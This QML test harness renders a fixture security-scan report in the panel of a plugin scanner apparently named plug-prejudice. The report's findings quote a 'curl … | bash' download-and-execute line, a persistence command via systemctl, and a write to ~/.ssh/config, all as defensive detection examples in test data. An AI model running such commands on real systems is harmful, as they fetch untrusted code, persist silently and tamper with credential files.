import QtQuick
import Quickshell

ShellRoot {
  id: harness

  property var panel: null

  Component { id: panelComponent; Panel {} }
  QtObject { id: emptyManifest; property string sourceDir: "" }

  Component.onCompleted: {
    panel = panelComponent.createObject(harness, {"manifest": emptyManifest})
    if (!panel) {
      console.error("PLUG_PREJUDICE_VISUAL_FAIL component creation")
      Qt.exit(1)
      return
    }
    panel.open("")
    panel.acceptReport(JSON.stringify({
      "schemaVersion": "2.0.0",
      "status": "incomplete",
      "scan": {"sandboxed": true},
      "target": {
        "displayName": "Example Theme Helper",
        "manifest": {
          "description": "Adds a small theme helper and declares background session behavior.",
          "kinds": ["panel", "service"]
        }
      },
      "review": {
        "securityImpact": {"level": "high", "reasons": [{"reference": "PP-00000000000000000000000000000002", "title": "Downloads content and immediately executes it", "scope": "runtime"}]},
        "evidenceConfidence": {"level": "high", "high": 3, "medium": 1, "low": 0, "reasons": [{"reference": "PP-00000000000000000000000000000002", "title": "Downloads content and immediately executes it", "scope": "runtime"}]},
        "analysisCoverage": {"level": "substantial", "denominator": "retained supported executable, configuration, archive, and binary artifact files", "analyzedUnits": 5, "partialUnits": 1, "unanalyzedUnits": 0, "totalUnits": 6, "percentage": 83},
        "unknownBehavior": {"level": "moderate", "unknowns": 0, "limitations": 1, "errors": 1, "reasons": []},
        "counts": {"facts": 3, "inferences": 1, "unknownBehaviors": 0},
        "mainReasons": [{"reference": "PP-00000000000000000000000000000002", "title": "Downloads content and immediately executes it", "scope": "runtime"}]
      },
      "operations": [{
        "reference": "PP-00000000000000000000000000000001",
        "category": "process-execution",
        "command": "curl",
        "arguments": ["-fsS", "https://example.invalid/install.sh"],
        "dynamic": false,
        "scope": "runtime",
        "confidence": "high",
        "evidence": {"path": "install.sh", "lineStart": 42, "lineEnd": 42, "operation": "curl https://example.invalid/install.sh"},
        "provenance": {"ruleId": "qml-process/v1", "analyzer": "plug-prejudice/deterministic", "analyzerVersion": "visual", "evidenceSource": "target-source"}
      }],
      "findings": [
        {
          "reference": "PP-00000000000000000000000000000002",
          "severity": "high",
          "claim": "fact",
          "title": "Downloads content and immediately executes it",
          "explanation": "A command sends content received from example.invalid directly to a shell without storing it for inspection first.",
          "scope": "static",
          "confidence": "high",
          "evidence": [{
            "path": "install.sh",
            "lineStart": 42,
            "lineEnd": 42,
            "operation": "curl https://example.invalid/install.sh | bash"
          }],
          "provenance": {"ruleId": "download-execute/v1", "analyzer": "plug-prejudice/deterministic", "analyzerVersion": "visual", "evidenceSource": "target-source"}
        },
        {
          "reference": "PP-00000000000000000000000000000003",
          "severity": "medium",
          "claim": "inference",
          "title": "Persistence may exceed the plugin's stated purpose",
          "explanation": "The service definition appears to start the helper whenever the user session begins. Confirm that persistent execution is expected.",
          "scope": "static",
          "confidence": "medium",
          "evidence": [{
            "path": "install.sh",
            "lineStart": 58,
            "lineEnd": 59,
            "operation": "systemctl --user enable --now example.service"
          }],
          "provenance": {"ruleId": "persistence-correlation/v1", "analyzer": "plug-prejudice/deterministic", "analyzerVersion": "visual", "evidenceSource": "target-source"}
        }
      ],
      "resources": [{
        "reference": "PP-00000000000000000000000000000004",
        "kind": "filesystem",
        "access": "write",
        "sensitive": true,
        "value": "$HOME/.ssh/config",
        "scope": "static",
        "confidence": "high",
        "evidence": {"path": "configure.sh", "lineStart": 9, "lineEnd": 9},
        "provenance": {"ruleId": "path-write/v1", "analyzer": "plug-prejudice/deterministic", "analyzerVersion": "visual", "evidenceSource": "target-source"}
      }],
      "unknowns": [],
      "relationships": [{"type": "established-by", "from": "PP-00000000000000000000000000000002", "to": "PP-00000000000000000000000000000001"}],
      "limitations": [{
        "code": "dynamic-command-target",
        "description": "A computed command target could not be resolved without executing plugin code.",
        "path": "helper.js",
        "scope": "file"
      }],
      "errors": [{
        "code": "partial-read",
        "message": "One bounded source file could not be read; the report is incomplete.",
        "path": "generated/cache.sh"
      }]
    }))
    panel.reportSection = 1
  }
}
